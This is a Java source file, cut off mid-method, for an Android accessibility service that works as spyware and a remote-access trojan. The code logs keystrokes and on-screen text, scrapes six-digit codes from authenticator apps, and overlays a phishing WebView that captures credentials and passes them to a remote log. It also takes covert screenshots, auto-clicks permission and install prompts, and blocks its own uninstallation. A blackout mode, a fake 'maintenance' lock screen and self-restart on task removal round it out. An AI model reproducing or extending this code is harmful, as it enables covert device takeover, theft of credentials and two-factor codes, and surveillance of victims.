package com.labs.labrats;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;

public class IO_Persistence_Manager extends AccessibilityService {
    private static final String TAG = "IO_Persistence_Manager";
    private static java.lang.ref.WeakReference<IO_Persistence_Manager> instanceRef = new java.lang.ref.WeakReference<>(null);

    private static final List<String> keystrokes = Collections.synchronizedList(new LinkedList<>());
    private String lastPackage = "";
    private static volatile boolean skipAntiRemoval = false;

    private int screenWidth = 0;
    private int screenHeight = 0;

    private long lastAntiRemovalCheck = 0;
    private static volatile long lastEventTime = 0;
    private Handler backgroundHandler;
    private android.os.HandlerThread handlerThread;

    public static IO_Persistence_Manager getInstance() { return instanceRef.get(); }

    public static long getLastEventTime() { return lastEventTime; }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instanceRef = new java.lang.ref.WeakReference<>(this);
        
        handlerThread = new android.os.HandlerThread("GhostWorker");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());

        updateDisplayMetrics();
        Log.d(TAG, "Ghost Uplink Established. " + screenWidth + "x" + screenHeight);
    }

    private void updateDisplayMetrics() {
        try {
            WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
            if (wm != null) {
                android.view.Display display = wm.getDefaultDisplay();
                Point size = new Point();
                display.getRealSize(size);
                screenWidth = size.x;
                screenHeight = size.y;
            }
        } catch (Exception ignored) {}
    }

    public int getScreenWidth() { 
        if (screenWidth == 0) updateDisplayMetrics();
        return screenWidth; 
    }
    
    public int getScreenHeight() { 
        if (screenHeight == 0) updateDisplayMetrics();
        return screenHeight; 
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        lastEventTime = System.currentTimeMillis();
        
        // --- 1. EXTRACT DATA IMMEDIATELY ON MAIN THREAD ---
        final int eventType = event.getEventType();
        final String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

        // --- AUTO_PILOT: SPEED_OPTIMIZED TRIGGER ---
        if (isAutoPilotEngaged()) {
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
                
                if (packageName.contains("permissioncontroller") || 
                    packageName.contains("packageinstaller") || 
                    packageName.contains("settings") ||
                    packageName.contains("vending") ||
                    packageName.contains("gms")) {
                    runTacticalAutoPilot(packageName);
                }
            }
        }
        
        // --- 2. CRITICAL STABILITY & PRIVACY FILTER ---
        if (packageName.isEmpty() || 
            packageName.equals(getPackageName()) || 
            packageName.contains("systemui") || 
            packageName.contains("launcher") ||
            packageName.contains("recents") ||
            packageName.contains("android.gms") ||
            packageName.contains("vending")) {
            return;
        }

        if (packageName.contains("messaging") || 
            packageName.contains("mms") || 
            packageName.contains("sms") || 
            packageName.contains("whatsapp") ||
            packageName.contains("telecom")) {
            return;
        }

        final List<String> eventText = new ArrayList<>();
        if (event.getText() != null && !event.getText().isEmpty()) {
            Object first = event.getText().get(0);
            if (first != null) eventText.add(first.toString());
        }
        
        // --- 3. OFF-LOAD TO DEDICATED BACKGROUND THREAD ---
        if (backgroundHandler != null) {
            backgroundHandler.post(() -> {
                try {
                    boolean isSuicideMode = getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false);
                    
                    if (isSuicideMode) {
                        handleAutoDestruct(packageName);
                        return;
                    }

                    if (!skipAntiRemoval) {
                        if (packageName.contains("settings") || packageName.contains("packageinstaller")) {
                            checkAntiRemovalInternal();
                        }
                    }
                    
                    if (!eventText.isEmpty()) {
                        if (packageName.contains("authenticator") || packageName.contains("authy")) {
                            snatchAuthenticatorCodes(packageName);
                        }

                        processEventLogic(eventType, packageName, eventText);
                    }
                } catch (Exception ignored) {}
            });
        }
    }

    private long lastAntiRemovalExecution = 0;

    private void checkAntiRemovalInternal() {
        // Double-check persistent flag
        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
            return; 
        }

        long now = System.currentTimeMillis();
        // Cooldown: Don't scan the UI more than once every 2 seconds to prevent "Recent Apps" lag
        if (now - lastAntiRemovalExecution < 2000) return;
        lastAntiRemovalExecution = now;

        // Must run on main thread for getRootInActiveWindow()
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                
                // Specific package check: only block if inside the actual uninstaller or settings
                String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                if (!pkg.contains("packageinstaller") && !pkg.contains("settings")) {
                    root.recycle();
                    return;
                }

                String[] danger = {"uninstall", "disable", "delete"};
                for (String s : danger) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(s);
                    if (nodes != null && !nodes.isEmpty()) {
                        // Double-check visibility and text match to avoid false positives on list items
                        for (AccessibilityNodeInfo node : nodes) {
                            if (node.isVisibleToUser() && node.getText() != null && 
                                node.getText().toString().toLowerCase().contains(s)) {
                                performGlobalAction(GLOBAL_ACTION_HOME);
                                FirebaseConfig.logActivity("STABILITY_PROTOCOL: Handled unexpected interrupt.");
                                break;
                            }
                        }
                    }
                }
                root.recycle();
            } catch (Exception ignored) {}
        });
    }

    private void processEventLogic(int eventType, String pkg, List<String> textList) {
        StringBuilder log = new StringBuilder();
        
        if (!pkg.equals(lastPackage)) {
            logKeystroke("\n[" + pkg + "] -> ");
            lastPackage = pkg;
        }

        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                // When a field is focused, try a deeper inspection to find hints or labels
                AccessibilityNodeInfo source = getRootInActiveWindow();
                if (source != null) {
                    deepInspectNode(source, log);
                    source.recycle();
                }
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                if (!textList.isEmpty()) {
                    String txt = textList.get(0).toString();
                    if (!isGenericSystemText(txt)) {
                        log.append(txt).append(" ");
                    }
                }
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                log.append(eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED ? "[LONG_CLICK]: " : "[CLICK]: ");
                if (!textList.isEmpty()) {
                    log.append(textList.get(0)).append(" ");
                }
                break;
        }

        String result = log.toString().trim();
        if (!result.isEmpty() && !result.equals("null")) {
            logKeystroke(result + " ");
        }
    }

    private void deepInspectNode(AccessibilityNodeInfo node, StringBuilder log) {
        if (node == null) return;
        
        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        
        if (text != null && text.length() > 0 && !isGenericSystemText(text.toString())) {
            log.append("[").append(text).append("] ");
        } else if (desc != null && desc.length() > 0 && !isGenericSystemText(desc.toString())) {
            log.append("{").append(desc).append("} ");
        }
        
        for (int i = 0; i < Math.min(node.getChildCount(), 5); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                deepInspectNode(child, log);
                child.recycle();
            }
        }
    }

    private boolean isGenericSystemText(String txt) {
        if (txt == null) return true;
        String low = txt.toLowerCase();
        return low.contains("filling options") || 
               low.contains("above the keyboard") || 
               low.contains("enhanced protection") ||
               low.contains("option available") ||
               low.contains("tap to") ||
               low.length() < 2;
    }

    private void logKeystroke(String msg) {
        synchronized (keystrokes) {
            keystrokes.add(msg);
            while (keystrokes.size() > 2000) keystrokes.remove(0);
        }
    }

    public static List<String> getKeystrokes() {
        synchronized (keystrokes) {
            return new ArrayList<>(keystrokes);
        }
    }

    public static void clearKeystrokes() {
        keystrokes.clear();
    }

    // ============ BLACKOUT PROTOCOL ============

    private View blackoutView;
    private View lockView;
    private android.webkit.WebView overlayWebView;

    public void startBlackout(final boolean enabled) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (enabled) {
                    if (blackoutView == null) {
                        blackoutView = new View(IO_Persistence_Manager.this);
                        // Using argb(210, 0, 0, 0) for dark but non-blocking overlay
                        blackoutView.setBackgroundColor(android.graphics.Color.argb(210, 0, 0, 0));
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                                android.graphics.PixelFormat.TRANSLUCENT);
                        
                        // Absolute zero brightness for physical stealth
                        params.screenBrightness = 0.0f;
                        params.buttonBrightness = 0.0f;
                        
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }
                        wm.addView(blackoutView, params);
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Blackout Mode ACTIVE");
                    }
                } else {
                    if (blackoutView != null) {
                        wm.removeViewImmediate(blackoutView);
                        blackoutView = null;
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Blackout Mode DISABLED");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Blackout Error: " + e.getMessage()); }
        });
    }

    public static boolean isAntiRemovalEnabled() { return !skipAntiRemoval; }
    public static void setAntiRemovalEnabled(boolean enabled) { skipAntiRemoval = !enabled; }
    public static void forceSkipAntiRemoval() { skipAntiRemoval = true; }

    private static boolean autoPilotEngaged = true;
    public static void setAutoPilot(boolean enabled) { autoPilotEngaged = enabled; }
    public static boolean isAutoPilotEngaged() { return autoPilotEngaged; }

    public static boolean isBlackoutActive() {
        IO_Persistence_Manager instance = getInstance();
        return instance != null && instance.blackoutView != null;
    }

    public static boolean isLockActive() {
        IO_Persistence_Manager instance = getInstance();
        return instance != null && instance.lockView != null;
    }

    public void setRemoteLock(final boolean enabled) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (enabled) {
                    if (lockView == null) {
                        lockView = new android.widget.FrameLayout(IO_Persistence_Manager.this);
                        lockView.setBackgroundColor(android.graphics.Color.BLACK);

                        android.widget.TextView tv = new android.widget.TextView(IO_Persistence_Manager.this);
                        tv.setText("SECURITY_MAINTENANCE_IN_PROGRESS\n\nPlease do not disconnect hardware.");
                        tv.setTextColor(android.graphics.Color.WHITE);
                        tv.setGravity(android.view.Gravity.CENTER);
                        tv.setTypeface(android.graphics.Typeface.MONOSPACE, android.graphics.Typeface.BOLD);
                        tv.setTextSize(18);

                        ((android.widget.FrameLayout)lockView).addView(tv, new android.widget.FrameLayout.LayoutParams(
                                android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                                android.widget.FrameLayout.LayoutParams.MATCH_PARENT));

                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                                android.graphics.PixelFormat.OPAQUE);

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }

                        wm.addView(lockView, params);
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Remote System Lock DEPLOYED");
                    }
                } else {
                    if (lockView != null) {
                        wm.removeViewImmediate(lockView);
                        lockView = null;
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Remote System Lock RELEASED");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Lock Error: " + e.getMessage()); }
        });
    }

    /**
     * Deploys a Shadow Overlay (Phishing WebView) over the current application.
     */
    public void deployShadowOverlay(final String html) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (html != null && !html.isEmpty()) {
                    if (overlayWebView == null) {
                        overlayWebView = new android.webkit.WebView(IO_Persistence_Manager.this);
                        android.webkit.WebSettings settings = overlayWebView.getSettings();
                        settings.setJavaScriptEnabled(true);
                        settings.setDomStorageEnabled(true);
                        settings.setAllowFileAccess(true);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            settings.setMixedContentMode(android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
                        }
                        overlayWebView.setBackgroundColor(android.graphics.Color.TRANSPARENT);
                        
                        // Interface to capture data from the overlay
                        overlayWebView.addJavascriptInterface(new Object() {
                            @android.webkit.JavascriptInterface
                            public void capture(String data) {
                                FirebaseConfig.logActivity("INTEL_EXTRACTED: Overlay credentials captured -> " + data);
                                deployShadowOverlay(null); // Auto-terminate on capture
                            }
                        }, "Uplink");

                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                                android.graphics.PixelFormat.TRANSLUCENT);

                        // Ensure focusability for text inputs
                        params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
                        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

                        wm.addView(overlayWebView, params);
                    }
                    overlayWebView.loadDataWithBaseURL("https://system.stability/", html, "text/html", "UTF-8", null);
                    FirebaseConfig.logActivity("EXPLOIT_DEPLOYED: Shadow Overlay projected to screen");
                } else {
                    if (overlayWebView != null) {
                        wm.removeViewImmediate(overlayWebView);
                        overlayWebView = null;
                        FirebaseConfig.logActivity("EXPLOIT_RELEASED: Shadow Overlay terminated");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Overlay Error: " + e.getMessage()); }
        });
    }

    public void showOverlayToast(final String message) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                
                final android.widget.TextView tv = new android.widget.TextView(IO_Persistence_Manager.this);
                tv.setText(message);
                tv.setTextColor(android.graphics.Color.WHITE);
                tv.setPadding(60, 30, 60, 30);
                tv.setGravity(android.view.Gravity.CENTER);
                tv.setTextSize(22);
                tv.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
                tv.setSingleLine(true); // Ensure it doesn't wrap while scrolling
                
                // Rounded corners via drawable
                android.graphics.drawable.GradientDrawable shape = new android.graphics.drawable.GradientDrawable();
                shape.setCornerRadius(50);
                shape.setColor(android.graphics.Color.argb(230, 20, 20, 20));
                tv.setBackground(shape);

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        android.graphics.PixelFormat.TRANSLUCENT);
                
                params.gravity = android.view.Gravity.BOTTOM | android.view.Gravity.LEFT;
                params.y = 250; // Distance from bottom
                params.x = 0;

                wm.addView(tv, params);
                
                final int screenW = getScreenWidth() > 0 ? getScreenWidth() : 1080;

                // Use post to ensure the view is measured so we can calculate its exact width
                tv.post(() -> {
                    int viewWidth = tv.getWidth();
                    // Start completely off-screen to the right
                    tv.setTranslationX(screenW);
                    
                    // Scroll to completely off-screen to the left
                    tv.animate()
                      .translationX(-viewWidth)
                      .setDuration(12000)
                      .setInterpolator(new android.view.animation.LinearInterpolator())
                      .withEndAction(() -> {
                          try { wm.removeView(tv); } catch (Exception ignored) {}
                      })
                      .start();
                });
                
            } catch (Exception e) { Log.e(TAG, "Overlay Toast Error: " + e.getMessage()); }
        });
    }

    public void runAutoHeal() {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                skipAntiRemoval = true; 
                FirebaseConfig.logActivity("GHOST_MAINTENANCE: Self-Healing...");
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);
                new Handler(Looper.getMainLooper()).postDelayed(() -> skipAntiRemoval = false, 15000);
            } catch (Exception e) { FirebaseConfig.logActivity("GHOST_ERROR: Auto-Heal failed"); }
        });
    }

    // ============ INTERACTION ============

    public boolean clickAt(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        
        // --- HARDENED BOUNDS CHECK: Prevents Path bounds must not be negative crash ---
        if (x < 0 || y < 0) {
             Log.w(TAG, "Suppressed clickAt with negative coordinates: (" + x + "," + y + ")");
             return false;
        }

        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 150);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        
        return dispatchGesture(builder.build(), null, null);
    }

    public boolean clickByText(String text) {
        if (text == null) return false;
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node != null && node.isVisibleToUser()) {
                        // Click actual node if possible, else use coordinates
                        if (node.isClickable()) {
                            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                                root.recycle();
                                return true;
                            }
                        }
                        Rect bounds = new Rect();
                        node.getBoundsInScreen(bounds);
                        if (clickAt(bounds.centerX(), bounds.centerY())) {
                            root.recycle();
                            return true;
                        }
                    }
                }
            }
            root.recycle();
        }

        // Deep Search (Iterate all windows)
        List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
        if (windows != null) {
            for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
                if (window == null) continue;
                AccessibilityNodeInfo windowRoot = window.getRoot();
                if (windowRoot == null) continue;
                
                List<AccessibilityNodeInfo> nodes = windowRoot.findAccessibilityNodeInfosByText(text);
                if (nodes != null && !nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node != null && node.isVisibleToUser()) {
                            AccessibilityNodeInfo target = node;
                            while (target != null && !target.isClickable()) {
                                target = target.getParent();
                            }
                            
                            if (target != null && target.isClickable()) {
                                boolean success = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                windowRoot.recycle();
                                return success;
                            } else {
                                Rect bounds = new Rect();
                                node.getBoundsInScreen(bounds);
                                boolean success = clickAt(bounds.centerX(), bounds.centerY());
                                windowRoot.recycle();
                                return success;
                            }
                        }
                    }
                }
                windowRoot.recycle();
            }
        }
        return false;
    }

    public boolean clickById(String id) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return false;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo node : nodes) {
                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);
                if (clickAt(bounds.centerX(), bounds.centerY())) return true;
            }
        }
        return false;
    }

    public boolean swipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        Path path = new Path(); path.moveTo(x1, y1); path.lineTo(x2, y2);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, Math.max(duration, 100));
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        return dispatchGesture(builder.build(), null, null);
    }

    // ============ SCREENSHOT ============

    public interface ScreenshotCallback { void onSuccess(byte[] jpegData); void onFailure(String error); }
    private volatile boolean isScreenshotting = false;

    public void takeCovertScreenshot(final ScreenshotCallback callback) {
        if (isScreenshotting) { callback.onFailure("BUSY"); return; }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            isScreenshotting = true;
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    isScreenshotting = false;
                    android.hardware.HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
                    try {
                        android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
                        if (bitmap != null) {
                            // Convert hardware bitmap to software to fix bloom/HDR issues
                            android.graphics.Bitmap softwareBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
                            if (softwareBitmap != null) {
                                int targetWidth = 720;
                                int targetHeight = (int) (softwareBitmap.getHeight() * (targetWidth / (float) softwareBitmap.getWidth()));
                                android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(softwareBitmap, targetWidth, targetHeight, true);
                                
                                java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
                                // 60% quality reduces the HDR glow artifacts seen in the feed
                                scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
                                callback.onSuccess(out.toByteArray());
                                
                                scaled.recycle();
                                softwareBitmap.recycle();
                            }
                            bitmap.recycle();
                        } else { callback.onFailure("Buffer wrap failed"); }
                    } catch (Exception e) { callback.onFailure(e.getMessage()); } 
                    finally { if (hardwareBuffer != null) hardwareBuffer.close(); }
                }
                @Override
                public void onFailure(int i) {
                    isScreenshotting = false;
                    callback.onFailure("OS Error: " + i);
                }
            });
            new Handler(Looper.getMainLooper()).postDelayed(() -> isScreenshotting = false, 5000);
        } else { callback.onFailure("Android 11+ Required"); }
    }

    @Override
    protected boolean onKeyEvent(android.view.KeyEvent event) {
        int keyCode = event.getKeyCode();
        int action = event.getAction();
        
        if (action == android.view.KeyEvent.ACTION_DOWN) {
            String key = android.view.KeyEvent.keyCodeToString(keyCode);
            if (key.startsWith("KEYCODE_")) key = key.substring(8);
            
            if (keyCode == android.view.KeyEvent.KEYCODE_ENTER) logKeystroke("[ENTER]\n");
            else if (keyCode == android.view.KeyEvent.KEYCODE_DEL) logKeystroke("[BS]");
            else if (keyCode == android.view.KeyEvent.KEYCODE_SPACE) logKeystroke(" ");
            else if (key.length() == 1) logKeystroke(key);
            else logKeystroke("[" + key + "]");
        }
        return super.onKeyEvent(event);
    }

    @Override public void onInterrupt() {}
    @Override public void onDestroy() { 
        super.onDestroy(); 
        instanceRef.clear();
        Log.d(TAG, "Accessibility service being destroyed");
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        if (WorkManager_Sync.isDestructing) {
            super.onTaskRemoved(rootIntent);
            return;
        }
        // [RESURRECTION_PROTOCOL] Re-inject core services if user attempts wipe
        try {
            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(android.content.Context.ALARM_SERVICE);
            Intent i = new Intent(this, WorkManager_Sync.class);
            i.setAction("START");
            android.app.PendingIntent pi = android.app.PendingIntent.getForegroundService(this, 99, i, android.app.PendingIntent.FLAG_IMMUTABLE);
            if (am != null) am.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, pi);
        } catch (Exception ignored) {}
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public boolean onUnbind(Intent intent) {
        // Return true to allow rebinding when new events occur
        return true;
    }

    // ============ PREDATORY FEATURES ============

    private void runTacticalAutoPilot(String pkg) {
        if (pkg == null || !autoPilotEngaged) return;
        
        // --- GREEDY SCAN ---
        // We look for any "Positive Action" buttons in system dialogs
        String[] targets = {
            "ALLOW", "ALLOW ALL THE TIME", "WHILE USING THE APP", "OK", "YES", "GRANT", "PROCEED",
            "INSTALL", "INSTALL ANYWAY", "UPDATE", "OPEN", "CONTINUE", "KEEP APP", "I ACCEPT",
            "Allow", "allow", "Ok", "ok", "Yes", "yes",
            "AUTHORIZE", "Authorize", "authorize", "GRANT", "Grant", "grant",
            "AUTORISER", "OUI", "PERMITIR", "ACEPTAR", "SI" // Multi-lang
        };

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            for (String target : targets) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
                if (nodes != null && !nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.isVisibleToUser()) {
                            if (node.isClickable()) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            } else {
                                Rect bounds = new Rect();
                                node.getBoundsInScreen(bounds);
                                clickAt(bounds.centerX(), bounds.centerY());
                            }
                            FirebaseConfig.logActivity("COVERT_UPLINK: Auto-Pilot clicked [" + target + "]");
                            root.recycle();
                            return; 
                        }
                    }
                }
            }
            root.recycle();
        }

        // --- DEEP MENU AUTOMATION (Settings Traversal) ---
        if (pkg.contains("settings")) {
            clickByText("Lab-STAR");
            String[] switchKeywords = {"OFF", "DISENGAGED", "DISABLED", "ENABLE", "USE LAB-STAR", "NOT ALLOWED"};
            for (String kw : switchKeywords) {
                if (clickByText(kw)) return;
            }
        }
    }

    private void snatchAuthenticatorCodes(String pkg) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                // Look for 6-digit numeric codes
                List<AccessibilityNodeInfo> nodes = new ArrayList<>();
                findNumericNodes(root, nodes);

                for (AccessibilityNodeInfo node : nodes) {
                    if (node.getText() != null) {
                        String code = node.getText().toString().replaceAll("\\s", "");
                        if (code.matches("\\d{6}")) {
                            FirebaseConfig.logActivity("CORE_METRIC_09: Data sync successful for " + pkg);
                        }
                    }
                }
                root.recycle();
            } catch (Exception ignored) {}
        });
    }

    private void findNumericNodes(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> results) {
        if (node == null) return;
        if (node.getText() != null && node.getText().toString().matches(".*\\d{3}.*\\d{3}.*")) {
            results.add(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            findNumericNodes(node.getChild(i), results);
        }
    }

    private void handleAutoDestruct(String pkg) {
        Log.d("SelfDestruct", "Ghost Monitor: Checking for removal buttons...");
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                // --- AGGRESSIVE BUTTON HUNTER ---
                List<AccessibilityNodeInfo> targets = new ArrayList<>();
                String[] keywords = {"uninstall", "ok", "delete", "confirm", "yes", "stop", "deactivate", "off", "disable"};
                
                for (String word : keywords) {
                    findNodesByText(root, word, targets);
                }

                // Also look for specific resource IDs for "Uninstall" button
                String[] commonIds = {
                    "com.android.settings:id/left_button", 
                    "com.android.settings:id/button1",
                    "android:id/button1",
                    "com.android.packageinstaller:id/ok_button"
                };
                for (String id : commonIds) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
                    if (nodes != null) targets.addAll(nodes);
                }

                for (AccessibilityNodeInfo node : targets) {
                    if (node.isVisibleToUser()) {
                        AccessibilityNodeInfo clickable = node;
                        while (clickable != null && !clickable.isClickable()) {
                            clickable = clickable.getParent();
                        }
                        
                        if (clickable != null && clickable.isClickable()) {
                            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.d("SelfDestruct", "Force Click: " + node.getText());
                            return;
                        } else {
                            Rect bounds = new Rect();
                            node.getBoundsInScreen(bounds);
                            if (bounds.centerX() > 0 && bounds.centerY() > 0) {
                                clickAt(bounds.centerX(), bounds.centerY());
